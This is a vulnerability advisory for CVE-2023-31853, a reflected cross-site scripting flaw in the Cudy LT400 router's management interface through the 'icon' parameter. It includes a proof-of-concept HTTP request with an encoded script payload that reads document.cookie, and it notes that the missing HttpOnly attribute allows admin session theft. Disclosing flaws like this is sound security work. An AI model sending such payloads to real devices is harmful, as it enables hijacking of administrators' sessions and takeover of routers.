# CVE-2023-31853

Reflected cross-site scripting (XSS) attack exists in web-based management interface of Cudy LT400.

The page `/cgi-bin/luci/admin/network/bandwidth` has reflected XSS via the `icon` parameter.

The methods of exploitation would involve sending a specially crafted request to the victim that includes malicious code.

**The affected application does not set the Session Cookie with the HttpOnly attribute; this can result in admin takeover via session token theft.**

## PoC

```
GET /cgi-bin/luci/admin/network/bandwidth?iface=4g&icon=icon-4g%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&i18name=Cellular HTTP/1.1
Host: 172.16.1.1
User-Agent: Mozilla/5.0
Accept: text/html, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://172.16.1.1/cgi-bin/luci/
Cookie: sysauth=REDACTED
```

## Vendor

Shenzhen Cudy Technology

## CVE Reference

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-31853

## Product Reference

https://www.cudy.com
